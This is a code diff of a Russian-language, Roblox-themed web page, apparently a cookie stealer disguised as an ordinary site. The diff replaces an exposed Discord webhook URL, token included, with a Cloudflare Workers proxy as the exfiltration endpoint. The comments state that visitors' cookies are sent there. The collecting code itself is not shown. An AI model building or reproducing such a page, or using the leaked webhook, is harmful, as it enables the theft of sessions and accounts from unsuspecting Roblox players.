@@ -1,4 +1,3 @@
-
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -44,9 +43,9 @@
 </div>
 <script>
 (function(){
-    // ========== ТВОЙ ВЕБХУК (ОТКРЫТЫЙ, НО КУКИ ЛЕТЯТ) ==========
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1498389723306266674/bNYKAHZq1wNYXmJdyg7AhI58lRPmLrBcZRE2ltzOrWqUakFaneqaRlefOZrSJDxSAyo2";
-    // =========================================================
+    // ========== ТВОЙ ПРОКСИ (CLOUDFLARE WORKER) ==========
+    const WEBHOOK_URL = "https://robl.megadoner517.workers.dev";
+    // =====================================================
     
     const themeToggleBtn = document.getElementById('themeToggleBtn');
     function loadTheme(){const saved=localStorage.getItem('roblox_theme');if(saved==='light'){document.body.classList.add('light');if(themeToggleBtn)themeToggleBtn.innerHTML='<span>☀️</span> Тема'}else{document.body.classList.remove('light');if(themeToggleBtn)themeToggleBtn.innerHTML='<span>🌙</span> Тема'}}
